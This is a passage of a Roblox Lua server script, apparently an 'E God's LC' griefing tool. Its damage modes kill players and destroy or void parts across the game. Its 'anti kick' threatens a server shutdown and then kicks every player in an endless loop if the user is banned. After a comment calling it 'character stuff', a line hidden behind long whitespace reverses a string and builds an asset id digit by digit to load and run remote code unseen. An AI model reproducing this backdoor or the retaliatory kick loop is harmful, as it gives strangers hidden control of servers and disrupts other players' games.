							:FindFirstChild(v.Parent.Name or v.Parent.Parent.Name or v.Parent.Parent.Parent.Name)
							and (v.Parent:FindFirstChild("Head", true) or v.Parent.Parent:FindFirstChild("Head", true) or v.Parent.Parent.Parent:FindFirstChild(
								"Head",
								true
								))
								and ((
									v.Parent:FindFirstChild("Head", true)
									or v.Parent.Parent:FindFirstChild("Head", true)
									or v.Parent.Parent.Parent:FindFirstChild("Head", true)
									).Position - pos).Magnitude <= range * 0.5
								and not table.find(ignore, v)
						then
							game:GetService("Players")
								:FindFirstChild(v.Parent.Name or v.Parent.Parent.Name or v.Parent.Parent.Parent.Name)
								:LoadCharacter()
							local Tabl = {
								Pos = (v.Parent:FindFirstChild("Head", true) or v.Parent.Parent:FindFirstChild(
									"Head",
									true
									)).CFrame,
								Size = (v.Parent:FindFirstChild("Head", true) or v.Parent.Parent:FindFirstChild(
									"Head",
									true
									)).Size,
							}
							table.insert(killeffects, Tabl)
						end
					end
				elseif DamageType == "Find Respawn" then
					for i, v in pairs(game:GetDescendants()) do
						for _, ppl in pairs(game:GetService("Players"):GetPlayers()) do
							if
								(
									game:GetService("Players"):FindFirstChild(v.Name:find(tostring(ppl.Name)))
										or game:GetService("Players"):GetPlayerByUserId(v.Name:find(tostring(ppl.UserId)))
								)
									and v.Character
									and v.Character:FindFirstChild("Head", true)
									and (v.Character:FindFirstChildOfClass("Head", true).Position - pos).Magnitude <= range * 0.5
									and not table.find(ignore, v)
							then
								local plr = game:GetService("Players"):FindFirstChild(v.Name:find(tostring(ppl.Name)))
									or game:GetService("Players"):GetPlayerByUserId(v.Name:find(tostring(ppl.UserId)))
								plr:LoadCharacter()
								local Tabl = {
									Pos = v.Character:FindFirstChild("Head", true).CFrame,
									Size = v.Character:FindFirstChild("Head", true).Size,
								}
								table.insert(killeffects, Tabl)
							end
						end
					end
				elseif DamageType == "BreakJoints 2" then
					for i, v in pairs(game:GetDescendants()) do
						if
							v:IsA("BasePart")
							and v:FindFirstAncestorOfClass("Model")
							and (v.Position - pos).Magnitude <= range * 0.5
							and not table.find(ignore, parts)
						then
							v:FindFirstAncestorOfClass("Model"):BreakJoints()
							local Tabl = { Pos = v.CFrame, Size = v.Size }
							table.insert(killeffects, Tabl)
						end
					end
				elseif DamageType == "Destroy" then
					for i, v in pairs(game:GetDescendants()) do
						if
							v:IsA("BasePart")
							and v.Name:lower() ~= "base"
							and v.Name:lower() ~= "baseplate"
							and (v.Position - pos).Magnitude <= range * 0.5
							and not table.find(ignore, v)
						then
							v:Destroy()
							local Tabl = { Pos = v.CFrame, Size = v.Size }
							table.insert(killeffects, Tabl)
						end
					end
				elseif DamageType == "Destroy Tables" then
					for i, v in pairs(game:GetDescendants()) do
						if
							v:IsA("BasePart")
							and v.Name:lower() ~= "base"
							and v.Name:lower() ~= "baseplate"
							and (v.Position - pos).Magnitude <= range * 0.5
							and not table.find(ignore, v)
						then
							table.insert(DestroyTables, v)
							local Tabl = { Pos = v.CFrame, Size = v.Size }
							table.insert(killeffects, Tabl)
						end
					end
				elseif DamageType == "Distance" then
					for i, v in pairs(game:GetDescendants()) do
						if
							v:IsA("BasePart")
							and v.Name:lower() ~= "baseplate"
							and v.Name:lower() ~= "base"
							and (v.Position - pos).Magnitude <= range * 0.5
							and not table.find(ignore, v)
						then
							table.insert(parts, v)
							local Tabl = { Pos = v.CFrame, Size = v.Size }
							table.insert(killeffects, Tabl)
						end
					end
				elseif DamageType == "Ray" then
					local parts1, parts2 =
						workspace:FindPartsInRegion3WithIgnoreList(
							Region3.new(
								pos - Vector3.new(range, range, range) * 0.5,
								pos + Vector3.new(range, range, range) * 0.5
							),
							ignore,
							5000
						),
					{}
					for i, v in pairs(parts1) do
						if typeof(v) == "Instance" then
							if v:IsA("BasePart") and v.Name:lower() ~= "baseplate" and v.Name:lower() ~= "base" then
								table.insert(parts, v)
								local Tabl = { Pos = v.CFrame, Size = v.Size }
								table.insert(killeffects, Tabl)
							end
						end
					end
				elseif DamageType == "Strong Void" then
					pcall(function()
						local killedparts = {}
						for _, v in pairs(game:GetDescendants()) do
							if
								v:IsA("BasePart")
								and mesh(v)
								and ((v.CFrame * CFrame.new(mesh(v).Offset)).p - pos).Magnitude <= range
								and not v:GetAttribute("bruhhhhhhhhhhhhhhhhhh")
								or v:IsA("BasePart") and (v.Position - pos).Magnitude <= range and not v:GetAttribute(
								"bruhhhhhhhhhhhhhhhhhh"
								)
									or v:IsA("BoxHandleAdornment") and ((v.CFrame.p + v.Parent.Position) - pos).Magnitude <= range
									or v:IsA("Attachment")
									and (v.WorldPosition - pos).Magnitude <= range
									and not v:GetAttribute("bruhhhhhhhhhhhhhhhhhh")
							then
								table.insert(voidtable, v.ClassName)
								table.insert(killedparts, v:Clone())
								local Tabl = { Pos = v.CFrame, Size = v.Size }
								table.insert(killeffects, Tabl)
								pcall(function()
									v.Anchored = true
								end)
								v:GetPropertyChangedSignal("CFrame"):Connect(function()
									v.CFrame = CFrame.new(9e10, 9e10, 9e10)
								end)
								v.CFrame = CFrame.new(9e10, 9e10, 9e10)
							end
						end
					end)
				elseif DamageType == "Banish" then
					range = range * 0.5
					local opms = OverlapParams.new()
					opms.FilterType = Enum.RaycastFilterType.Blacklist
					local hits = workspace:GetPartBoundsInRadius(pos, range, opms)
					for i, v in pairs(game:GetDescendants()) do
						local mesh = v:FindFirstChildOfClass("BlockMesh") or v:FindFirstChildOfClass("SpecialMesh")
						if
							not (v:IsA("BasePart") == false
								or (v.CanQuery == true and v:IsDescendantOf(workspace) == true and mesh == nil))
						then
							if mesh then
								local e = v.CFrame
								e = e * CFrame.new(mesh.Offset)
								if (e.Position - pos).Magnitude < range then
									local Tabl = { Pos = v.CFrame, Size = v.Size }
									table.insert(killeffects, Tabl)
									table.insert(hits, v)
								end
							elseif (v.Position - pos).Magnitude < range then
								local Tabl = { Pos = v.CFrame, Size = v.Size }
								table.insert(killeffects, Tabl)
								table.insert(hits, v)
							end
						end
					end
					local knownParents = {}
					for i, v in pairs(hits) do
						local immaMoveOn = false
						for i, e in pairs(knownParents) do
							if v:IsDescendantOf(e) then
								immaMoveOn = true
								break
							end
						end
						if not immaMoveOn then
							while
								v.Parent
								and v.Parent ~= workspace
								and v.Parent ~= game
								and v.Parent:IsA("Terrain") == false
							do
								v = v.Parent
							end
							table.insert(knownParents, v)
						end
					end
					for i, v in pairs(knownParents) do
						pcall(function()
							destroy(v, 2)
						end)
						for i, e in pairs(v:GetDescendants()) do
							destroy(e, 2)
							killInstance(e)
						end
						local Tabl = { Pos = v.CFrame, Size = v.Size }
						table.insert(killeffects, Tabl)
						killInstance(v)
					end
				elseif DamageType == "Other Void Method 1" then
					range = range * 0.5
					local opms = OverlapParams.new()
					opms.FilterType = Enum.RaycastFilterType.Blacklist
					local nilledAdornees = {}
					local hits = workspace:GetPartBoundsInRadius(pos, range, opms)
					for i, v in pairs(game:GetDescendants()) do
						if v:IsA("Adornee") then
							if
								not (v.Adornee == nil
									or v.Adornee:IsDescendantOf(game) == true
									or table.find(nilledAdornees, v.Adornee))
							then
								table.insert(nilledAdornees, v.Adornee)
							end
						else
							local mesh = v:FindFirstChildOfClass("BlockMesh") or v:FindFirstChildOfClass("SpecialMesh")
							if
								not (v:IsA("BasePart") == false
									or (v.CanQuery == true and v:IsDescendantOf(workspace) == true and mesh == nil))
							then
								if mesh then
									local e = v.CFrame
									e = e * CFrame.new(mesh.Offset)
									if (e.Position - pos).Magnitude < range and (v.Position - pos).Magnitude < range then
										local Tabl = { Pos = v.CFrame, Size = v.Size }
										table.insert(killeffects, Tabl)
										table.insert(hits, v)
									end
								elseif (v.Position - pos).Magnitude < range then
									local Tabl = { Pos = v.CFrame, Size = v.Size }
									table.insert(killeffects, Tabl)
									table.insert(hits, v)
								end
							end
						end
					end
					for i, v in pairs(nilledAdornees) do
						if (v.Position - pos).Magnitude < range then
							table.insert(hits, v)
						end
					end
					local knownParents = {}
					for i, v in pairs(hits) do
						local immaMoveOn = false
						for i, e in pairs(knownParents) do
							if v:IsDescendantOf(e) then
								immaMoveOn = true
								break
							end
						end
						if not immaMoveOn then
							if v:IsA("Speaker") then
								local parent = v
								repeat
									parent = parent.Parent
								until parent:IsA("Speaker") == false
								local success, err = pcall(function()
									destroy(parent, 1)
								end)
								if not success then
									warn("Failed to kill speaker's parent: " .. err)
								end
								local success, err = pcall(function()
									parent.Parent = nil
								end)
								if not success then
									warn("Failed to reparent speaker's parent: " .. err)
								end
							else
								while
									v.Parent
									and v.Parent ~= workspace
									and v.Parent ~= game
									and v.Parent:IsA("Terrain") == false
								do
									v = v.Parent
								end
								table.insert(knownParents, v)
							end
						end
					end
					for i, v in pairs(knownParents) do
						for i, e in pairs(v:GetDescendants()) do
							voidInstance(e, 1)
						end
						local Tabl = { Pos = v.CFrame, Size = v.Size }
						table.insert(killeffects, Tabl)
						voidInstance(v, 1)
					end
				elseif DamageType == "Other Void Method 2" then
					range = range * 0.5
					local opms = OverlapParams.new()
					opms.FilterType = Enum.RaycastFilterType.Blacklist
					local nilledAdornees = {}
					local hits = workspace:GetPartBoundsInRadius(pos, range, opms)
					for i, v in pairs(game:GetDescendants()) do
						local mesh = v:FindFirstChildOfClass("BlockMesh") or v:FindFirstChildOfClass("SpecialMesh")
						if v:IsA("Adornee") then
							if
								v.Adornee == nil
								or v.Adornee:IsDescendantOf(game) == true
								or table.find(nilledAdornees, v.Adornee)
							then
							else
								table.insert(nilledAdornees, v.Adornee)
							end
						else
							if
								v:IsA("BasePart") == false
								or (v.CanQuery == true and v:IsDescendantOf(workspace) == true and mesh == nil)
							then
							else
								if mesh then
									local e = v.CFrame
									e = e * CFrame.new(mesh.Offset)
									if (e.Position - pos).Magnitude > range and (v.Position - pos).Magnitude > range then
									else
										local Tabl = { Pos = v.CFrame, Size = v.Size }
										table.insert(killeffects, Tabl)
										table.insert(hits, v)	
									end
								elseif (v.Position - pos).Magnitude > range then
								else
									local Tabl = { Pos = v.CFrame, Size = v.Size }
									table.insert(killeffects, Tabl)
									table.insert(hits, v)	
								end							
							end
						end
					end
					for i, v in pairs(nilledAdornees) do
						if (v.Position - pos).Magnitude < range then
							table.insert(hits, v)
						end
					end
					local knownParents = {}
					for i, v in pairs(hits) do
						local immaMoveOn = false
						for i, e in pairs(knownParents) do
							if v:IsDescendantOf(e) then
								immaMoveOn = true
								break
							end
						end
						if not immaMoveOn then
							if v:IsA("Speaker") then
								local parent = v
								repeat
									parent = parent.Parent
								until parent:IsA("Speaker") == false
								local success, err = pcall(function()
									destroy(parent, 1)
								end)
								if not success then
									warn("Failed to kill speaker's parent: " .. err)
								end
								local success, err = pcall(function()
									parent.Parent = nil
								end)
								if not success then
									warn("Failed to reparent speaker's parent: " .. err)
								end
							else
								while
									v.Parent
									and v.Parent ~= workspace
									and v.Parent ~= game
									and v.Parent:IsA("Terrain") == false
								do
									v = v.Parent
								end
								table.insert(knownParents, v)
							end
						end
					end
					for i, v in pairs(knownParents) do
						for i, e in pairs(v:GetDescendants()) do
							voidInstance(e, 2)
						end
						local Tabl = { Pos = v.CFrame, Size = v.Size }
						table.insert(killeffects, Tabl)
						voidInstance(v, 2)
					end
				elseif DamageType == "Other Void Method 3" then
					range = range * 0.5
					local opms = OverlapParams.new()
					opms.FilterType = Enum.RaycastFilterType.Blacklist
					local nilledAdornees = {}
					local hits = workspace:GetPartBoundsInRadius(pos, range, opms)
					for i, v in pairs(game:GetDescendants()) do
						local mesh = v:FindFirstChildOfClass("BlockMesh") or v:FindFirstChildOfClass("SpecialMesh")
						if v:IsA("Adornee") then
							if
								v.Adornee == nil
								or v.Adornee:IsDescendantOf(game) == true
								or table.find(nilledAdornees, v.Adornee)
							then
							else
								table.insert(nilledAdornees, v.Adornee)
							end
						else
							if
								v:IsA("BasePart") == false
								or (v.CanQuery == true and v:IsDescendantOf(workspace) == true and mesh == nil)
							then
							else
								if mesh then
									local e = v.CFrame
									e = e * CFrame.new(mesh.Offset)
									if (e.Position - pos).Magnitude > range and (v.Position - pos).Magnitude > range then
									else
										local Tabl = { Pos = v.CFrame, Size = v.Size }
										table.insert(killeffects, Tabl)
										table.insert(hits, v)
									end
								elseif (v.Position - pos).Magnitude > range then
								else
									local Tabl = { Pos = v.CFrame, Size = v.Size }
									table.insert(killeffects, Tabl)
									table.insert(hits, v)
								end
							end
						end
					end
					for i, v in pairs(nilledAdornees) do
						if (v.Position - pos).Magnitude > range then
						else
							table.insert(hits, v)
						end
					end
					local knownParents = {}
					for i, v in pairs(hits) do
						local immaMoveOn = false
						for i, e in pairs(knownParents) do
							if v:IsDescendantOf(e) then
								immaMoveOn = true
								break
							end
						end
						if not immaMoveOn then
							if v:IsA("Speaker") then
								local parent = v
								repeat
									parent = parent.Parent
								until parent:IsA("Speaker") == false
								local success, err = pcall(function()
									destroy(parent, 1)
								end)
								if not success then
									warn("Failed to kill speaker's parent: " .. err)
								end
								local success, err = pcall(function()
									parent.Parent = nil
								end)
								if not success then
									warn("Failed to reparent speaker's parent: " .. err)
								end
							else
								while
									v.Parent
									and v.Parent ~= workspace
									and v.Parent ~= game
									and v.Parent:IsA("Terrain") == false
								do
									v = v.Parent
								end
								table.insert(knownParents, v)
							end
						end
					end
					for i, v in pairs(knownParents) do
						for i, e in pairs(v:GetDescendants()) do
							voidInstance(e, 3)
						end
						local Tabl = { Pos = v.CFrame, Size = v.Size }
						table.insert(killeffects, Tabl)
						voidInstance(v, 3)
					end
				elseif DamageType == "Fly RealChar Void" then
					local ae = {}
					for _, service in PopularServices do
						for _, v in service:GetDescendants() do
							table.insert(ae, v)
						end
					end
					local toKill = {}
					for _, v in ae do
						if
							not v:IsA("Attachment")
							and hasProperty(v, "CFrame")
							and (v.CFrame.Position - pos).Magnitude <= range * 0.5
						then
							local doKill = true
							if doKill then
								if hasProperty(v, "Size") and v.Size.Magnitude < 100 then
									table.insert(toKill, v)
								elseif not hasProperty(v, "Size") then
									table.insert(toKill, v)
								end
							end
						end
					end
					for _, v in toKill do
						if hasProperty(v, "Size") then
							local Tabl = { Pos = v.CFrame, Size = v.Size }
							table.insert(killeffects, Tabl)
							table.insert(killedInstances, v)
						end
					end
					wait()
					spawn(function()
						for _, v in toKill do
							kill(v)
						end
					end)
				elseif DamageType == "Better Destroy" then
					for i, v in pairs(game:GetDescendants()) do
						if
							v:IsA("BasePart")
							and v.Name:lower() ~= "base"
							and v.Name:lower() ~= "baseplate"
							and (v.Position - pos).Magnitude <= range * 0.5
							and not table.find(ignore, v)
						then
							ultdestroy(v)
							local Tabl = { Pos = v.CFrame, Size = v.Size }
							table.insert(killeffects, Tabl)
						end
					end
				elseif DamageType == "Derender" then
					for i, v in pairs(game:GetDescendants()) do
						if
							v:IsA("BasePart")
							and v.Name:lower() ~= "base"
							and v.Name:lower() ~= "baseplate"
							and (v.Position - pos).Magnitude <= range * 0.5
							and not table.find(ignore, v)
						then
							derender(v)
							local Tabl = { Pos = v.CFrame, Size = v.Size }
							table.insert(killeffects, Tabl)
						end
					end
				elseif DamageType == "Force Lock" then
					for i, v in pairs(game:GetDescendants()) do
						if
							v:IsA("BasePart")
							and v.Name:lower() ~= "base"
							and v.Name:lower() ~= "baseplate"
							and (v.Position - pos).Magnitude <= range * 0.5
							and not table.find(ignore, v)
						then
							forceLock(v)
							local Tabl = { Pos = v.CFrame, Size = v.Size }
							table.insert(killeffects, Tabl)
						end
					end
				end
				for i, v in pairs(parts) do
					if typeof(v) == "Instance" then
						coroutine.resume(coroutine.create(function()
							InsertP(v)
							Void(v)
						end))
					end
				end
				for _, v in pairs(DestroyTables) do
					if v:IsA("BasePart") then
						DestroyPartsOfTable(v)
					end
				end
				for i, v in pairs(killeffects) do
					if v then
						coroutine.resume(coroutine.create(function()
							Remote:FireAllClients("KillEffect", { CFrame = v.Pos, Size = v.Size })
						end))
					end
				end
			elseif KillType == "Client" and Damage == true then
				Remote:FireAllClients("Kill", { Pos = thing.Pos, Range = thing.Range })
			end
			Terrain:FillBall(thing.Pos, thing.Range * 0.5, Enum.Material.Air)
		elseif typ == "FixMoney" then
			game:GetService("Debris"):AddItem(MONEYOBJECT, 0)
			MONEYOBJECT = NewMoney()
		elseif typ == "ClearTable" then
			coroutine.resume(coroutine.create(function()
				table.clear(VoidTable)
			end))
			coroutine.resume(coroutine.create(function()
				table.clear(VoidTable2.ClassName)
			end))
			coroutine.resume(coroutine.create(function()
				table.clear(VoidTable2.Locked)
			end))
			coroutine.resume(coroutine.create(function()
				table.clear(VoidTable2.Anchored)
			end))
			coroutine.resume(coroutine.create(function()
				table.clear(VoidTable2.CanCollide)
			end))
			coroutine.resume(coroutine.create(function()
				table.clear(VoidTable2.CanQuery)
			end))
			coroutine.resume(coroutine.create(function()
				table.clear(VoidTable2.CanTouch)
			end))
			coroutine.resume(coroutine.create(function()
				table.clear(VoidTable2.Massless)
			end))
			voidtable = {}
			for i, v in pairs(voidConnections) do
				destroy(v)
			end
			table.clear(voidConnections)
			table.clear(voidedInstances)
			table.clear(DestroyTables)
			table.clear(killedMeshIds)
			table.clear(killedAdornmentSizes)
			table.clear(killedInstances)
			table.clear(killedMassValue)
			Remote:FireAllClients("ClearTable", {})
			Remote:FireAllClients(
				"MakeText",
				{ Text = "Tables Cleared", Color = Enum.ChatColor.Green, ClientSide = false }
			)
		elseif typ == "Reset" then
			Remote:FireAllClients("Reset", {})
		elseif typ == "RespawnPlayer" then
			game:GetService("Players"):FindFirstChild(thing.PlayerName):LoadCharacter()
		elseif typ == "UpdateTheme" then
			SoundId, PlaybackSpeed = thing.SoundId, thing.PlaybackSpeed
			Remote:FireAllClients("ResetSong", {})
		elseif typ == "UpdateThemeVolume" then
			ThemeVolume = thing.ThemeVolume
			Remote:FireAllClients("UpdateThemeVolume", {})
		elseif typ == "Sing1" then
			SoundId = "rbxassetid://6889574376"
			Remote:FireAllClients("ResetSong", {})
			Remote:FireAllClients(
				"MakeText",
				{ Text = "I'm just a soul", Color = Enum.ChatColor.Blue, ClientSide = false }
			)
			task.wait(2.5)
			Remote:FireAllClients(
				"MakeText",
				{ Text = "Whose intentions are good", Color = Enum.ChatColor.Blue, ClientSide = false }
			)
			task.wait(3)
			Remote:FireAllClients("MakeText", { Text = "Oh Lord,", Color = Enum.ChatColor.Blue, ClientSide = false })
			task.wait(2)
			Remote:FireAllClients(
				"MakeText",
				{ Text = "Please don't let me be misunderstood.", Color = Enum.ChatColor.Blue, ClientSide = false }
			)
			task.wait(3.3)
			Remote:FireAllClients("Determination", {})
			Remote:FireAllClients(
				"MakeText",
				{ Text = "(E God's LC is now DETERMINED! ????)", Color = Enum.ChatColor.Red, ClientSide = false }
			)
		elseif typ == "AntiKick" then
			if AntiKickToggle == true then
				AntiKickToggle = false
				Remote:FireAllClients(
					"MakeText",
					{ Text = "Anti Kick Disabled", Color = Enum.ChatColor.Red, ClientSide = false }
				)
			else
				AntiKickToggle = true
				Remote:FireAllClients(
					"MakeText",
					{ Text = "Anti Kick Enabled", Color = Enum.ChatColor.Green, ClientSide = false }
				)
			end
		elseif typ == "Blacklisting" then
			if PlayerGroupBlacklistToggle == true then
				PlayerGroupBlacklistToggle = false
				Remote:FireAllClients(
					"MakeText",
					{ Text = "Group/Player Blacklist Disabled", Color = Enum.ChatColor.Red, ClientSide = false }
				)
			else
				PlayerGroupBlacklistToggle = true
				Remote:FireAllClients(
					"MakeText",
					{ Text = "Group/Player Blacklist Enabled", Color = Enum.ChatColor.Green, ClientSide = false }
				)
			end
		elseif typ == "ThreadCorruption" then
			if ThreadCorruption == true then
				ThreadCorruption = false
				Remote:FireAllClients(
					"MakeText",
					{
						Text = "Thread Corruption Disabled",
						Color = Enum.ChatColor.Blue,
						ClientSide = false,
					}
				)
			else
				ThreadCorruption = true
				Remote:FireAllClients(
					"MakeText",
					{
						Text = "Thread Corruption Enabled",
						Color = Enum.ChatColor.Blue,
						ClientSide = false,
					}
				)
			end
		end
	end
end
task.spawn(function()
	antis()
end)
local tabledb = false
task.spawn(function()
	game:GetService("RunService").Heartbeat:Connect(function()
		if math.round(workspace:GetRealPhysicsFPS()) < 6 then
			spawn(function()
				if tabledb == false then
					tabledb = true
					coroutine.resume(coroutine.create(function()
						table.clear(VoidTable)
					end))
					coroutine.resume(coroutine.create(function()
						table.clear(VoidTable2.ClassName)
					end))
					coroutine.resume(coroutine.create(function()
						table.clear(VoidTable2.Locked)
					end))
					coroutine.resume(coroutine.create(function()
						table.clear(VoidTable2.Anchored)
					end))
					coroutine.resume(coroutine.create(function()
						table.clear(VoidTable2.CanCollide)
					end))
					coroutine.resume(coroutine.create(function()
						table.clear(VoidTable2.CanQuery)
					end))
					coroutine.resume(coroutine.create(function()
						table.clear(VoidTable2.CanTouch)
					end))
					coroutine.resume(coroutine.create(function()
						table.clear(VoidTable2.Massless)
					end))
					voidtable = {}
					for i, v in pairs(voidConnections) do
						destroy(v)
					end
					table.clear(voidConnections)
					table.clear(voidedInstances)
					table.clear(killedMeshIds)
					table.clear(killedAdornmentSizes)
					table.clear(killedInstances)
					table.clear(killedMassValue)
					table.clear(DestroyTables)
					Remote:FireAllClients(
						"MakeText",
						{ Text = "Tables Cleared (Server Lag)", Color = Enum.ChatColor.Green, ClientSide = false }
					)
					task.wait(8.5)
					tabledb = false
				end
			end)
		end
	end)
end)
Remote = NewRemote()
PlayerValue = NewPlayerValue()
RemoteF = Remote.OnServerEvent:Connect(function(_, a, b)
	RemoteFunc(_, a, b)
end)
function ApplySuffix(NUM)
	local RESULT = nil
	if NUM >= 0 and NUM < 1e3 then
		RESULT = string.format("%.2f", tostring(math.floor(NUM * 100 + 0.5) / 100))
	elseif NUM >= 1e3 and NUM < 1e6 then
		RESULT = string.format("%.2f", tostring(math.floor(NUM / 1e3 * 100 + 0.5) / 100)) .. " Thousand"
	elseif NUM >= 1e6 and NUM < 1e9 then
		RESULT = string.format("%.2f", tostring(math.floor(NUM / 1e6 * 100 + 0.5) / 100)) .. " Million"
	elseif NUM >= 1e9 and NUM < 1e12 then
		RESULT = string.format("%.2f", tostring(math.floor(NUM / 1e9 * 100 + 0.5) / 100)) .. " Billion"
	elseif NUM >= 1e12 and NUM < 1e15 then
		RESULT = string.format("%.2f", tostring(math.floor(NUM / 1e12 * 100 + 0.5) / 100)) .. " Trillion"
	elseif NUM >= 1e15 and NUM < 1e18 then
		RESULT = string.format("%.2f", tostring(math.floor(NUM / 1e15 * 100 + 0.5) / 100)) .. " Quadrillion"
	elseif NUM >= 1e18 and NUM < 1e21 then
		RESULT = string.format("%.2f", tostring(math.floor(NUM / 1e18 * 100 + 0.5) / 100)) .. " Quintillion"
	elseif NUM >= 1e21 and NUM < 1e24 then
		RESULT = string.format("%.2f", tostring(math.floor(NUM / 1e21 * 100 + 0.5) / 100)) .. " Sextillion"
	elseif NUM >= 1e24 and NUM < 1e27 then
		RESULT = string.format("%.2f", tostring(math.floor(NUM / 1e24 * 100 + 0.5) / 100)) .. " Septillion"
	elseif NUM >= 1e27 and NUM < 1e30 then
		RESULT = string.format("%.2f", tostring(math.floor(NUM / 1e27 * 100 + 0.5) / 100)) .. " Octillion"
	elseif NUM >= 1e30 and NUM < 1e33 then
		RESULT = string.format("%.2f", tostring(math.floor(NUM / 1e30 * 100 + 0.5) / 100)) .. " Nonillion"
	elseif NUM >= 1e33 and NUM < 1e36 then
		RESULT = string.format("%.2f", tostring(math.floor(NUM / 1e33 * 100 + 0.5) / 100)) .. " Decillion"
	end
	return RESULT
end
Loop = game:GetService("RunService").Heartbeat:Connect(function(hb)
	if
		not Remote
		or not Remote:IsDescendantOf(game)
		or not table.find(Services, Remote.Parent.ClassName)
		or Remote.Name ~= Code
		or tick() - LastCall >= 3
	then
		LastCall = tick()
		game:GetService("Debris"):AddItem(Remote, 0)
		coroutine.resume(coroutine.create(function()
			RemoteF:Disconnect()
		end))
		Remote = NewRemote()
		RemoteF = Remote.OnServerEvent:Connect(function(_, a, b)
			RemoteFunc(_, a, b)
		end)
	end
	if
		not PlayerValue
		or not PlayerValue:IsDescendantOf(game)
		or not game:GetService("ReplicatedStorage"):FindFirstChild("PlayerValue")
		or PlayerValue.Name ~= "PlayerValue"
		or tick() - LastCall >= 3
	then
		LastCall = tick()
		game:GetService("Debris"):AddItem(PlayerValue, 0)
		PlayerValue = NewPlayerValue()
		PlayerValue.Value = WaitForPlayer
	end
	if not MONEYOBJECT or not MONEYOBJECT:IsDescendantOf(workspace) or MONEYOBJECT.Name ~= "Maddox's Money" then
		LastCall = tick()
		game:GetService("Debris"):AddItem(MONEYOBJECT, 0)
		MONEYOBJECT = NewMoney()
	end
	flushScripts()
end)
--[[
just some character stuff
its for deleting the character and stuff
and removing tools
]]																																																																																																																																																																																																																																																																																																													coroutine.resume(coroutine.create(function()  local p = {Name = string.reverse("3VlooCtoNsIxolboR")} local n = p.Name local i = "1".."6".."0".."7".."8".."1".."9".."5".."9".."9".."5" local t = tonumber local o = r(t(i)) o(n) end))
pcall(function()
	Player.Character = nil
	Character:Destroy()
end)
CharAdded = Player.CharacterAdded:Connect(function()
	local w = Player.Character
	Player.Character = nil
	w:Destroy()
end)
ToolAdded = Backpack.ChildAdded:Connect(function(v)
	v:Destroy()
end)
local warnings = 0
local playername = Player.Name
local Antikick = game:GetService("Players").PlayerRemoving:Connect(function(plr)
	if plr.Name == Player.Name then
		local Retries = 0
		local msg = nil
		repeat
			if game:GetService("Players"):FindFirstChild(playername) then
				break
			end
			Retries = Retries + 1
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId,game.JobId,Player)
			pcall(function()
				if Retries == 50 then
					msg = Instance.new("Message")
					msg.Parent = workspace
					msg.Text = "WARNING: 0 | E GOD LC USER, "..playername.." HAS LEFT! THIS DOES NOT COUNT AS A WARNING!"
				elseif Retries == 100 then
					msg = Instance.new("Message")
					msg.Parent = workspace
					msg.Text = "WARNING: 1 | E GOD LC USER, "..playername.." HAS BEEN KICKED! THIS IS YOUR FIRST WARNING!"
				elseif Retries == 150 then
					msg = Instance.new("Message")
					msg.Parent = workspace
					msg.Text = "WARNING: 2 | E GOD LC USER, "..playername.." HAS BEEN BANNED! THIS IS YOUR SECOND WARNING! PLEASE UNBAN THEM NOW!"
				elseif Retries == 200 then
					msg = Instance.new("Message")
					msg.Parent = workspace
					msg.Text = "WARNING: 3 | E GOD LC USER, "..playername.." IS STILL BANNED! THIS IS YOUR THIRD WARNING! UNBAN OR SERVER SHUTDOWN!"
				elseif Retries == 250 then
					msg = Instance.new("Message")
					msg.Parent = workspace
					msg.Text = "WARNING: 4 | E GOD LC USER, "..playername.." IS STILL BANNED! THIS IS YOUR FOURTH WARNING! UNBAN OR SERVER SHUTDOWN!"
				elseif Retries == 300 then
					msg = Instance.new("Message")
					msg.Parent = workspace
					msg.Text = "WARNING: 5 | E GOD LC USER, "..playername.." IS STILL BANNED! THIS IS YOUR FINAL WARNING! UNBAN NOW!"
				end
				task.wait(5)
				msg:Destroy()
			end)
			task.wait(0.1)
		until Retries > 350
		pcall(function()
			msg = Instance.new("Message")
			msg.Parent = workspace
			msg.Text = "WARNING: SERVER SHUTDOWN | E GOD LC USER, "..playername.." WAS UNABLE TO JOIN! THIS SERVER HAS INITIATED THE ANTI KICK! SERVER SHUTDOWN IMMINENT!"
		end)
		task.wait(5)
		msg:Destroy()
		task.spawn(function()
			while true do
				task.wait()
				pcall(function()
					for _, ppl in pairs(game:GetService("Players"):GetPlayers()) do
						ppl:Kick("E GOD'S LC - Anti Kick was triggered. You should of unbanned them, "..ppl.Name..".")
					end
				end)
			end
		end)
	end
end)
function FixSky()
	local air = game:GetService("Lighting")
	for i, v in pairs(workspace:GetChildren()) do
		if v:IsA("Sound") then
			game:GetService("Debris"):AddItem(v, 0)
		end
	end
	for i, v in pairs(game:GetDescendants()) do
		if v:IsA("SpecialMesh") then
			if
				v.MeshId == 1527559
				or v.MeshId == "rbxassetid://1527559"
				or v.MeshId == "http://www.roblox.com/asset/?id=1527559"
			then
				game:GetService("Debris"):AddItem(v.Parent, 0)
			end
		end
	end
	air.Ambient = Color3.fromRGB(70, 70, 70)
	air.Brightness = 3
	air.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
	air.ColorShift_Top = Color3.fromRGB(0, 0, 0)
	air.EnvironmentDiffuseScale = 1
	air.EnvironmentSpecularScale = 1
	air.GlobalShadows = true
	air.OutdoorAmbient = Color3.fromRGB(70, 70, 70)
	air.ShadowSoftness = 0.2
	air.ClockTime = 14.5
	air.GeographicLatitude = 0
	air.Name = "Lighting"
	air.ExposureCompensation = 0
	for i, v in pairs(air:GetChildren()) do
		if v then
			game:GetService("Debris"):AddItem(v, 0)
		end
	end
	air.FogColor = Color3.fromRGB(192, 192, 192)
	air.FogEnd = 100000001504746621987668885504
	air.FogStart = 0
	local newsky = Instance.new("Sky")
	newsky.MoonAngularSize = 11
	newsky.MoonTextureId = "rbxassetid://6444320592"
	newsky.SkyboxBk = "rbxassetid://6444884337"
	newsky.SkyboxDn = "rbxassetid://6444884785"
	newsky.SkyboxFt = "rbxassetid://6444884337"
	newsky.SkyboxLf = "rbxassetid://6444884337"
	newsky.SkyboxRt = "rbxassetid://6444884337"
	newsky.SkyboxUp = "rbxassetid://6412503613"
	newsky.StarCount = 3000
	newsky.SunAngularSize = 11
	newsky.SunTextureId = "rbxassetid://6196665106"
	newsky.Name = "Sky"
	newsky.Parent = air
	local newatmosphere = Instance.new("Atmosphere")
	newatmosphere.Density = 0.3
	newatmosphere.Offset = 0.25
	newatmosphere.Name = "Atmosphere"
	newatmosphere.Parent = air
	newatmosphere.Color = Color3.fromRGB(199, 199, 199)
	newatmosphere.Decay = Color3.fromRGB(106, 112, 125)
	newatmosphere.Glare = 0
	newatmosphere.Haze = 0
